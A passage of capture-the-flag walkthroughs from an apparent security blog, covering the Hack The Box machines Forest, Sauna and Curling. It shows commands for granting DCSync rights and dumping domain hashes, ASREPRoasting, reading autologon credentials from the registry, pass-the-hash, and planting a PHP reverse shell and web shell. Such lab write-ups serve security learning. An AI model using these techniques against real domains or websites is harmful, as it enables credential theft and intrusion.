<p><em>in order to supply bloodhound with the information it needs,</em> we will need to run a tool called <code class="language-plaintext highlighter-rouge">SharpHound</code> (https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) to collect details about the domain.</p>

<p>We upload it to the machine using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">upload</code> function and run it using the <code class="language-plaintext highlighter-rouge">-c all</code> flag to perform all collection methods.</p>

<p><img src="/assets/Forest/Sharphound-collection.jpg" alt="Sharphound-collection" /></p>

<p>We’re going to transfer the data (<code class="language-plaintext highlighter-rouge">20220405150628_BloodHound.zip</code>) over to our kali machine in order to feed it to <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>

<p>We do that using impacket’s <code class="language-plaintext highlighter-rouge">smbserver.py</code></p>

<p><img src="/assets/Forest/smb-server.jpg" alt="smb-server" /></p>

<p>and then mount it on the victim machine use the <code class="language-plaintext highlighter-rouge">net use</code> command, moving the <code class="language-plaintext highlighter-rouge">.zip</code> file and then unmounting the share.</p>

<p><img src="/assets/Forest/mounting-smb.jpg" alt="mounting-smb" /></p>

<p><em>afterwards,</em> we upload the file into <code class="language-plaintext highlighter-rouge">bloodhound</code> and start checking what we can do having owned the <code class="language-plaintext highlighter-rouge">svc-alfresco</code> service account. we run the <code class="language-plaintext highlighter-rouge">shortest path from owned principles</code> query:</p>

<p><img src="/assets/Forest/bloodhound-query.jpg" alt="bloodhound-query" /></p>

<p>This query shows us no real path to being a domain admin. So we try another query: <code class="language-plaintext highlighter-rouge">Shortest Paths to High Value Targets</code></p>

<p><img src="/assets/Forest/bloodhound-query-2.jpg" alt="bloodhound-query-2" /></p>

<h3 id="abusing-membership-in-account-operators--the-high-privileges-of-exchange-windows-permissions-ad-groups">Abusing membership in <code class="language-plaintext highlighter-rouge">Account Operators</code> &amp; the high privileges of <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> AD groups</h3>

<p>It looks horrible at first. <em>But, after taking a closer look,</em> we notice that our account <em>being in the</em> <code class="language-plaintext highlighter-rouge">account operators</code> <em>group</em> can add a member to a certain group called <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> which happens to have <code class="language-plaintext highlighter-rouge">WriteDACL</code> on <code class="language-plaintext highlighter-rouge">htb.local</code> (<strong>The entire domain!</strong>). <em>Having that privilege</em> means we can abuse it to give ourselves the <code class="language-plaintext highlighter-rouge">DCSync</code> right that we can use to dump all the domain hashes!</p>

<p><img src="/assets/Forest/path-to-DA.jpg" alt="path-to-DA" /></p>

<p><img src="/assets/Forest/abuse-write-dacl.jpg" alt="abuse-write-dacl" /></p>

<p>we add our user to that group using a powershell command: <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'</code></p>

<p><img src="/assets/Forest/adding-to-group.jpg" alt="adding-to-group" /></p>

<p>we then upload <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the victim machine and import it using <code class="language-plaintext highlighter-rouge">import-module .\PowerView.ps1</code>. This enables access to all the powershell cmdlets included within that module.</p>

<h3 id="checking-the-help-for-the-add-domainobjectacl-command">Checking the help for the <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> command</h3>

<p>we view the help page and usage examples of the abuse command <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> using <code class="language-plaintext highlighter-rouge">Get-Help Add-DomainObjectAcl -Examples</code></p>

<p><img src="/assets/Forest/abuse-command-help.jpg" alt="abuse-command-help" /></p>

<p>we notice that we need to create a Powershell <code class="language-plaintext highlighter-rouge">Credential Object</code> and run the command to give our user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> <code class="language-plaintext highlighter-rouge">DCSync</code> rights over <code class="language-plaintext highlighter-rouge">htb.local</code>. It should be as below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SecPassword = ConvertTo-SecureString 's3rvice'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
</code></pre></div></div>

<p>This takes a little while to run but we eventually have permission to dump hashes.</p>

<h3 id="and-down-the-hashes-go">And down the hashes go…</h3>

<p>We use impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> and voala! :D</p>

<p><img src="/assets/Forest/hashes_dumped.jpg" alt="hashes_dumped" /></p>

<h3 id="pass-the-hash-for-the-win-">Pass-the-Hash for the win :)</h3>

<p><em>Using the administrator NTLM hash,</em> we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to remote inside and we’re done with the box :D</p>

<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller machine. Anonymous LDAP is enabled which we use to get a full list of AD users. After performing an ASREPRoast attack, we end up with a user that has PowerShell Remoting Access. Using BloodHound for Domain Enumeration, we find that the user is member of the Account Operators group which gives him the privilege of adding users to AD groups other than Domain Admins etc. We add our user to a group called ‘Exchange Windows Permissions’ which has a write DACL over the domain. Abusing this privilege lets us give ourselves the DCSync right over the domain using PowerView which lets us grab all its NTLM hashes We use the Domain Administrator’s hash in a simple Pass-the-Hash attack to gain full access.]]></summary></entry><entry><title type="html">Sauna</title><link href="https://omnisl4sh.github.io/2022/04/08/Sauna.html" rel="alternate" type="text/html" title="Sauna" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/08/Sauna</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/08/Sauna.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>We find a <strong>domain controller</strong> with <strong>IIS</strong> running on port 80.</li>
  <li>It turns out to be the <strong>company website</strong> and we create a <strong>list of usernames</strong> from the <strong>‘Meet the Team’ page</strong>.</li>
  <li>We try <strong>ASREPRoasing</strong> and get <strong>creds for a user with PowerShell Remoting capabilities</strong>.</li>
  <li><em>Enumerating Autologon,</em> we find <strong>creds for another user</strong> with <strong>DCSync</strong> privileges which we use to <strong>dump all domain NTLM hashes</strong>.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>We start off with an <code class="language-plaintext highlighter-rouge">nmap</code> scan for <code class="language-plaintext highlighter-rouge">all ports</code> and using <code class="language-plaintext highlighter-rouge">service detection</code> and <code class="language-plaintext highlighter-rouge">default scripts</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-08 21:43:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2022-04-08T21:44:00
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
</code></pre></div></div>
<p><em>Right off the bat,</em> we see <code class="language-plaintext highlighter-rouge">IIS 10.0</code> on port 80 which indicates either Windows Server 2016 or 2019.
We also see a collection of ports (DNS, Kerberos, LDAP, SMB, Secure LDAP and WinRM) along with <code class="language-plaintext highlighter-rouge">nmap</code> telling us that this box is more likely a <strong>Domain Controller</strong>. The domain name is <code class="language-plaintext highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code></p>

<h3 id="basic-osint-pulling-usernames-from-the-website-and-wordlist-generation">Basic OSINT: Pulling usernames from the website and Wordlist Generation</h3>

<p>we go and check out the website. And, we find mostly static content there that doesn’t give us much indication of an exploit. <em>However,</em> we do find a couple of potential usernames in the <code class="language-plaintext highlighter-rouge">/about.html</code> page at the bottom:</p>

<p><img src="/assets/Sauna/meet-the-team.jpg" alt="meet-the-team" /></p>

<p>we can use those to generate a wordlist to try against kerberos for user enumeration. <em>using a quick</em> <code class="language-plaintext highlighter-rouge">python</code> <em>script</em> (https://github.com/w0Tx/generate-ad-username), we generate a userlist like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...SNIP...
fergussmith
fergus-smith
fergus.smith
fersmi
fer-smi
fer.smi
fsmith
f-smith
f.smith
smithfergus
smith-fergus
smith.fergus
smifer
smi-fer
smi.fer
sfergus
s-fergus
s.fergus
smithf
smith-f
...SNIP...
</code></pre></div></div>

<p>this is based on <strong>commonly-used username schemes</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NameSurname
Name.Surname
NamSur (3letters of each)
Nam.Sur
NSurname
N.Surname
SurnameName
Surname.Name
SurnameN
Surname.N
</code></pre></div></div>

<h3 id="user-enumeration-using-kerbrute">User Enumeration using <code class="language-plaintext highlighter-rouge">kerbrute</code></h3>

<p><em>using</em> <code class="language-plaintext highlighter-rouge">kerbrute</code> <em>for user enumeration,</em> we find that the user <code class="language-plaintext highlighter-rouge">fsmith</code> exists:</p>

<p><img src="/assets/Sauna/fsmith-exists.jpg" alt="fsmith-exists" /></p>

<h3 id="asreproast-attack">ASREPRoast Attack</h3>

<p><em>Having only this one user,</em> we decide to <code class="language-plaintext highlighter-rouge">ASREPRoast</code> him to see if he doesn’t have <code class="language-plaintext highlighter-rouge">Kerberos Pre-Authentication</code> enabled. And he does! :D</p>

<p><img src="/assets/Sauna/ASREP-roasted.jpg" alt="ASREP-roasted" /></p>

<p>we go on and crack the hash using <code class="language-plaintext highlighter-rouge">john</code>. The password turns out to be <code class="language-plaintext highlighter-rouge">Thestrokes23</code></p>

<p><img src="/assets/Sauna/fsmith-cracked.jpg" alt="fsmith-cracked" /></p>

<p>The wordlist I used <code class="language-plaintext highlighter-rouge">gegalist.txt</code> is just a combination of all the wordlists in <strong>Seclists</strong>.</p>

<h3 id="powershell-remoting-with-fsmith">PowerShell Remoting with <code class="language-plaintext highlighter-rouge">fsmith</code></h3>

<p>we want to get <strong>remote code execution</strong> on the box, so we try <strong>PowerShell Remoting</strong> using a tool called <code class="language-plaintext highlighter-rouge">evil-winrm</code> (https://github.com/Hackplayers/evil-winrm). And are lucky :D</p>

<p><img src="/assets/Sauna/we-can-winrm.jpg" alt="we-can-winrm" /></p>

<h3 id="autologon-creds-for-svc_loanmgr">Autologon creds for <code class="language-plaintext highlighter-rouge">svc_loanmgr</code></h3>

<p><em>Looking around the box in the user profile and in the root directory,</em> we don’t see much intersting information. <em>However, when we check for autlogon creds,</em> we do find interesting credentials for the <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> user:</p>

<p>My <strong>PowerShell one-liner</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference='SilentlyContinue';'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {$Val = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_ ;if($Val){Write-Host -ForegroundColor Green "[+] $_`: $Val"; Clear-Variable Val}else{Write-Host "[-] $_`: Not found"}}
</code></pre></div></div>

<p><img src="/assets/Sauna/Autologon-creds.jpg" alt="Autologon-creds" /></p>

<p>This is amazing :D we now got two accounts!</p>

<h3 id="enumeration-with-bloodhound">Enumeration with <code class="language-plaintext highlighter-rouge">BloodHound</code></h3>

<p><em>Since this is an AD environment,</em> it’s only natural that we run <code class="language-plaintext highlighter-rouge">BloodHound</code>. <em>This time,</em> we’re going to use a python-based version called <code class="language-plaintext highlighter-rouge">bloodhound-python</code> (https://github.com/fox-it/BloodHound.py).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# bloodhound-python -u fsmith@EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL -v -c All
Password:
DEBUG: Resolved collection methods: dcom, objectprops, acl, trusts, session, localadmin, psremote, rdp, group
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: EGOTISTICAL-BANK.LOCAL
INFO: Found AD domain: egotistical-bank.local
DEBUG: Found primary DC: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Found Global Catalog server: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Using LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Using base DN: DC=egotistical-bank,DC=local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Authenticating to LDAP server
DEBUG: No LAPS attributes found in schema
DEBUG: Found KeyCredentialLink attributes in schema
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
DEBUG: Writing users to file: 20220408174125_users.json
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Authenticating to LDAP server
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-512
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-526
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-527
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-519
INFO: Found 7 users
DEBUG: Finished writing users
DEBUG: Writing groups to file: 20220408174125_groups.json
INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Authenticating to LDAP server
DEBUG: Querying GC for DN CN=Group Policy Creator Owners,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=Domain Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=Cert Publishers,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=Enterprise Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=Schema Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=Domain Controllers,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
DEBUG: Querying GC for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
INFO: Found 52 groups
DEBUG: Finished writing groups
DEBUG: Opening file for writing: 20220408174125_domains.json
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-1108
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-498
DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-516
INFO: Found 0 trusts
DEBUG: Finished writing domain info
INFO: Starting computer enumeration with 10 workers
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: Resolved: 10.10.10.175
DEBUG: Trying connecting to computer: SAUNA.EGOTISTICAL-BANK.LOCAL
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\srvsvc]
DEBUG: Access denied while enumerating Sessions on SAUNA.EGOTISTICAL-BANK.LOCAL, likely a patched OS
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: Found 544 SID: S-1-5-21-2966785786-3096785034-1186376766-500
DEBUG: Found 544 SID: S-1-5-21-2966785786-3096785034-1186376766-519
DEBUG: Sid is cached: ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL
DEBUG: Found 544 SID: S-1-5-21-2966785786-3096785034-1186376766-512
DEBUG: Sid is cached: DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\lsarpc]
DEBUG: Resolved SID to name: ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: Found 580 SID: S-1-5-21-2966785786-3096785034-1186376766-1105
DEBUG: Found 580 SID: S-1-5-21-2966785786-3096785034-1186376766-1108
DEBUG: Sid is cached: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\lsarpc]
DEBUG: Resolved SID to name: FSMITH@EGOTISTICAL-BANK.LOCAL
DEBUG: Write worker obtained a None value, exiting
DEBUG: Write worker is done, closing files
INFO: Done in 00M 28S
</code></pre></div></div>
<p>this leaves us a couple of <code class="language-plaintext highlighter-rouge">.json</code> files which we can zip before uploading to <code class="language-plaintext highlighter-rouge">bloodhound</code></p>

<p><img src="/assets/Sauna/Zipping-them-jsons.jpg" alt="Zipping-them-jsons" /></p>

<h3 id="abusing-dangerous-rights-dcsync">Abusing Dangerous Rights (DCSync)</h3>

<p><em>trying a standard</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>query,</em> we find that the user that own <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> happens to have a very dangerous right <code class="language-plaintext highlighter-rouge">DCSync</code> on the domain.</p>

<p><img src="/assets/Sauna/dc-sync-for-loanmgr.jpg" alt="dc-sync-for-loanmgr" /></p>

<p>Having this right means we can act as if we were <em>another domain controller</em> and ask for a <strong>full synchronization of all the password hashes of the domain.</strong></p>

<h3 id="full-domain-hash-dump">Full domain hash dump</h3>

<p>This can be achieved using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> tool:</p>

<p><img src="/assets/Sauna/secrets-dump.jpg" alt="secrets-dump" /></p>

<p><em>With the</em> <code class="language-plaintext highlighter-rouge">administrator</code>‘<em>s hash,</em> we can easily get a shell on the box using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">-H</code> flag to run what’s called a <code class="language-plaintext highlighter-rouge">pass-the-hash</code> attack.</p>

<p><img src="/assets/Sauna/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary We find a domain controller with IIS running on port 80. It turns out to be the company website and we create a list of usernames from the ‘Meet the Team’ page. We try ASREPRoasing and get creds for a user with PowerShell Remoting capabilities. Enumerating Autologon, we find creds for another user with DCSync privileges which we use to dump all domain NTLM hashes.]]></summary></entry><entry><title type="html">Curling</title><link href="https://omnisl4sh.github.io/2022/03/29/Curling.html" rel="alternate" type="text/html" title="Curling" /><published>2022-03-29T00:00:00+02:00</published><updated>2022-03-29T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/03/29/Curling</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/03/29/Curling.html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
  <li>we find <strong>Joomla</strong> running on HTTP port 80 and we get a <strong>list of usernames</strong> <em>from the posts on the main page.</em></li>
  <li><em>Inspecting the home page’s source code,</em> we find a comment about a <code class="language-plaintext highlighter-rouge">secret.txt</code> file which happens to be at the webroot.</li>
  <li>The contents of the file reveal a <strong>base64-encoded password</strong> which we use to <em>gain administrative access</em> to <strong>Joomla</strong> using the <code class="language-plaintext highlighter-rouge">floris</code> user.</li>
  <li>We <em>abuse</em> the <strong>Joomla Administrator’s</strong> ability to <em>edit PHP files</em> to place a <strong>reverse shell</strong> and gain access as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li>
  <li>We find a <strong>readable hexdump</strong> called <code class="language-plaintext highlighter-rouge">password_backup</code> in <code class="language-plaintext highlighter-rouge">floris</code>’s home folder which we <em>reverse</em> to a binary and <em>decompress</em> to gain the password for the <code class="language-plaintext highlighter-rouge">floris</code> user.</li>
  <li><em>Detecting unusal activity on the box</em> with <code class="language-plaintext highlighter-rouge">pspy</code> reveals a <em>cron job running as</em> <code class="language-plaintext highlighter-rouge">root</code> and executing a <code class="language-plaintext highlighter-rouge">curl</code> command that <em>reads its configuration from a file we can modify.</em></li>
  <li><em>Abusing</em> <code class="language-plaintext highlighter-rouge">curl</code> for <strong>privileged read/write access</strong> lets us get a shell as <code class="language-plaintext highlighter-rouge">root</code> by <em>forging our own</em> <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>We start out by doing the standard nmap with <code class="language-plaintext highlighter-rouge">-sC</code> and <code class="language-plaintext highlighter-rouge">-sV</code> flags:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">http-generator</code> <strong>NSE script</strong> showed <strong>Joomla</strong> as the web app on port 80. so we go ahead and check it out.</p>

<h3 id="checking-joomla-out">Checking Joomla Out</h3>

<p><img src="/assets/curling/Homepage.jpg" alt="Homepage" /></p>

<p>We notice two potential usernames:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">super user</code></li>
  <li><code class="language-plaintext highlighter-rouge">floris</code></li>
</ol>

<p>which could be of use. so we note them down. and try logging in with weak passwords like:</p>
<ul>
  <li>password</li>
  <li>Password</li>
  <li>P@ssw0rd</li>
  <li>P@$$w0rd</li>
  <li>admin</li>
  <li>root</li>
</ul>

<p>but they don’t work with either users.</p>

<p>so we visit <code class="language-plaintext highlighter-rouge">http://10.10.10.150/README.txt</code> to check out <strong>Joomla’s version</strong> and we notice it is <strong>3.8</strong></p>

<p><img src="/assets/curling/Joomla-Version.jpg" alt="Joomla-Version" /></p>

<p>we try doing a quick searchsploit <em>excluding Joomla Components</em> (<em>since there were a TON of them!</em>). but see no clear match of the version we detected.</p>

<p><img src="/assets/curling/searchsploit.jpg" alt="searchsploit" /></p>

<h3 id="specialized-scanner-joomscan">Specialized Scanner: Joomscan</h3>

<p>so we check to see if we can run a <strong>specialized scanner</strong> for Joomla (<em>since it’s a well-known CMS</em>). <em>After some research,</em> we find a tool called <code class="language-plaintext highlighter-rouge">joomscan</code>. We check out its help menu and notice it’s pretty straight forward. It accepts the <code class="language-plaintext highlighter-rouge">url</code> and give us the option to enumerate compoents using the <code class="language-plaintext highlighter-rouge">-ec</code> flag. <em>This could benefit us since we have noticed a million exploits for vulnerable Joomla components</em>.</p>

<p><img src="/assets/curling/joomscan-help.jpg" alt="joomscan-help" /></p>

<p><em>After running a scan,</em> we find that:</p>
<ul>
  <li>There wasn’t a firewall detected. which is nice :D</li>
  <li>The Joomla version was indeed 3.8.8 and wasn’t vulnerable.</li>
  <li>The <strong>Administrator panel</strong> is at <code class="language-plaintext highlighter-rouge">http://10.10.10.150/administrator/</code></li>
  <li>we find <code class="language-plaintext highlighter-rouge">directory listing</code> enabled on a couple of interesting urls:
    <ol>
      <li><code class="language-plaintext highlighter-rouge">/administrator/components</code></li>
      <li><code class="language-plaintext highlighter-rouge">/administrator/modules</code></li>
      <li><code class="language-plaintext highlighter-rouge">/administrator/templates</code></li>
    </ol>
  </li>
  <li>we find the components within the cms:
    <ol>
      <li>com_ajax</li>
      <li>com_banners</li>
      <li>com_contact</li>
      <li>com_content</li>
      <li>com_contenthistory</li>
      <li>com_fields</li>
      <li>com_finder</li>
      <li>com_mailto</li>
      <li>com_media</li>
      <li>com_newsfeeds</li>
      <li>com_search</li>
      <li>com_users</li>
      <li>com_wrapper</li>
    </ol>
  </li>
</ul>

<p>So we browse those directories for a bit to find out there wasn’t much valuable information there.</p>

<p>We also do <code class="language-plaintext highlighter-rouge">searchsploit</code> queries for the components found but we don’t find any exploits for them.</p>

<h3 id="checking-source-code">Checking Source Code</h3>

<p><em>Since the situation wasn’t looking too good with the “looking for an exploit” path,</em> we go back to the basics and look at the source code of the home page.
And lo and behold! we find a comment right at the bottom saying <code class="language-plaintext highlighter-rouge">secret.txt</code>!</p>

<p><img src="/assets/curling/secret-comment.jpg" alt="secret-comment" /></p>

<p>we can get a cleaner view if we grep for comments after <em>curling</em> the page:</p>

<p><img src="/assets/curling/comment-curl.jpg" alt="comment-curl" /></p>

<p><em>Anyway,</em> we browse to <code class="language-plaintext highlighter-rouge">/secret.txt</code> to find some text:</p>

<p><img src="/assets/curling/secret.jpg" alt="secret" /></p>

<p>I immediately try the text as the password on the admin panel with the users:</p>
<ol>
  <li>floris</li>
  <li>superuser</li>
  <li>admin</li>
  <li>administrator</li>
</ol>

<p>but nothing!</p>

<h3 id="its-not-a-complex-password--its-base64-encoded">It’s not a complex password … it’s Base64 encoded</h3>

<p><em>Despite that,</em> seeing this file hidden in the comments + it being called <code class="language-plaintext highlighter-rouge">secret.txt</code> are factors making me consider that it’s important. Something must be missing here… I go for a walk and come back to decide maybe this text <em>isn’t some randomly-generated password</em> and is encrypted or something. So i drop it onto <code class="language-plaintext highlighter-rouge">CyberChef</code> (https://gchq.github.io/CyberChef/). It was a base64 encoded text » <code class="language-plaintext highlighter-rouge">Curling2018!</code>.</p>

<p><img src="/assets/curling/Cracked.jpg" alt="cracked" /></p>

<p>We use this with the <code class="language-plaintext highlighter-rouge">floris</code> user and we are logged in as the <code class="language-plaintext highlighter-rouge">Super User</code>!</p>

<p>I thought to myself like “why you no think of this earlier?” XD</p>

<p><img src="/assets/curling/logged-in.jpg" alt="logged-in" /></p>

<h3 id="admin-on-joomla--php-code-execution">Admin on Joomla = PHP Code Execution</h3>

<p>Being logged in as the administrative user on Joomla means an <strong>easy shell</strong>.</p>

<p><code class="language-plaintext highlighter-rouge">Extensions -&gt; Templates -&gt; Templates --&gt; Select the Theme in Use --&gt; Edit Index.php for a PHP reverse shell</code> (https://pentestmonkey.net/tools/web-shells/php-reverse-shell)</p>

<p>Not the most stealthy option I know. But this is a CTF XD</p>

<p><em>If it were a real-world scenario though,</em> I would have set up a much more subtle payload like <code class="language-plaintext highlighter-rouge">php exec($_REQUEST["cmd"]);</code></p>

<p><img src="/assets/curling/revvy.jpg" alt="revvy" /></p>

<p><em>After upgrading our shell to fully-interactive TTY,</em> we start checking the system…</p>

<h3 id="browsing-user-home-folders">Browsing user home folders</h3>

<p>We find the user <code class="language-plaintext highlighter-rouge">floris</code> on the system. And, <em>as we’re browsing through his/her home folder,</em> we see two <em>non-standard</em> items:</p>
<ol>
  <li>a file called <code class="language-plaintext highlighter-rouge">password_backup</code> that we have read access to.</li>
  <li>a folder called <code class="language-plaintext highlighter-rouge">admin_area</code> where only <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">floris</code> can see its contents.</li>
</ol>

<p><img src="/assets/curling/Floris-Home.jpg" alt="Floris-Home" /></p>

<h3 id="reversing-a-hexdump-and-decompressing-multiple-layers">Reversing a hexdump and Decompressing multiple layers</h3>

<p>so we take a look at the contents of <code class="language-plaintext highlighter-rouge">password_backup</code> and see what looks like a <strong>hexdump</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@curling:/home/floris$ cat password_backup 
